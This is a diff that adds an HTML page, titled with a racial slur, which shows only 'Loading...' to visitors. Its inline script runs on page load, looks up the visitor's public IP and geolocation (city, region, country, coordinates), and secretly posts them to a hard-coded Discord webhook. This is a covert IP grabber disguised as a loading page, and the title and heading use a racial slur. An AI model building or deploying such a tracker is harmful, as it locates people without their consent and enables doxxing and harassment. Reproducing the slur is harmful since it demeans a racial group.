@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nigga Bin V2</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NiggaBin V2</h1>
+        <p>Loading...</p>
+        <script>
+            async function grabIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    const ip = data.ip;
+
+                    // Fetch geolocation data
+                    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const geoData = await geoResponse.json();
+
+                    // Prepare the message to send to Discord
+                    const message = {
+                        content: `IP Address: ${ip}\nCity: ${geoData.city}\nRegion: ${geoData.region_name}\nCountry: ${geoData.country_name}\nLatitude: ${geoData.latitude}\nLongitude: ${geoData.longitude}\nTimezone: ${geoData.timezone}\n`,
+                    };
+
+                    // Send the message to the Discord webhook
+                    await fetch('https://discord.com/api/webhooks/1429411277389697026/KvDDdIYrFQVPT211PBzSvL9ypK_W2kenlAbgIoe4KS1lztvhJWukFQYba-ml9h3c5Jlg', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message),
+                    });
+
+                    console.log('IP and location data sent to webhook');
+                } catch (error) {
+                    console.error('Error grabbing IP or sending to webhook:', error);
+                }
+            }
+
+            grabIP();
+        </script>
+    </div>
+</body>
+</html>
